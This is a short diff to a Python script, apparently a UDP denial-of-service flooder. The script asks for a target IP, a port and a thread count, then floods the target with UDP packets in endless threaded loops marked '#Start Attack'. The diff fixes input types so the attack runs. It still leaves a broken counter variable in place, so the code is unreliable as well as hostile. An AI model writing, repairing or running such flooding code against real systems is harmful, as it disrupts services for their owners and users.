@@ -4,11 +4,10 @@ import string
 from threading import Thread
 
 UDP_IP = input("TARGET IP:")
-UDP_PORT = input("TARGET PORT:")
-Threads = input("Threads:")
+UDP_PORT = int(input("TARGET PORT:"))
+Threads = int(input("Threads:"))
 
 message = ""
-msgcol = 0
 chars = string.ascii_letters + string.digits
 
 #Generation pocket
@@ -25,7 +24,7 @@ def bye(): # DOS function
     while True:
         sock.sendto(message, (UDP_IP, UDP_PORT))
         msgcol = msgcol + 1 
-        print ("1 message send total:" + msgcol)
+        print ("1 message send")
 
 for i in range(Threads): #Start Attack
     th = Thread(target=bye)
